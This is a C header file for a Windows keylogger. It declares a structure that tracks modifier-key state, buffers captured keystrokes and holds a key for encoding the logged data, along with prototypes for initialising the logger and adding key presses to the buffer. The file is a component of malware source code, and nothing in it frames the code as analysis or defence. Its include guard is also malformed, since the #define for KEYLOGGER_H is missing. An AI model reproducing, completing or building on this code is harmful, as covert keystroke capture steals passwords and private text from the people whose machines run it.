

#include "keypair.h"
#include "../program/utils.h"


#ifndef KEYLOGGER_H

#define NUM_KEYS 254  // 254 key
#define A 0x41  // key code for A
#define Z 0x5A

#define ZERO 0x30 // key code for 0
#define NINE 0x39

/**
 * structure to maintain state for the keys shift, caps lock,
 * and num pad keys
 * Also stores the keycodes and keeps track of the captured
 * keys that are to be logged
 */
typedef struct {
    KEY_PAIR* keyCodes[NUM_KEYS]; // array of KEY_PAIRS corresponding to their vkCodes

    BOOL shift;    // boolean shift pressed flag
    BOOL capsLock; // caps lock active flag
    BOOL numPad;   // num pad active flag
    
    char keyBuffer[MAX_BUFF_LEN]; // logged key buffer
    unsigned int bufferPtr;  // current pointer in the keyBuffer
    
    unsigned char encKey;    // the data encoding key
} KEY_LOGGER;


KEY_LOGGER* initKeyLogger(); // initialise a new key logger
void keyLoggerCleanup(KEY_LOGGER* kLogger); // cleanup keylogger memory

// update the bool state variables based on the key pressed, returns whether an update occurred
BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode);
// method to add the content of a key press to the keyBuffer 
ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode);


#endif // KEYLOGGER_h
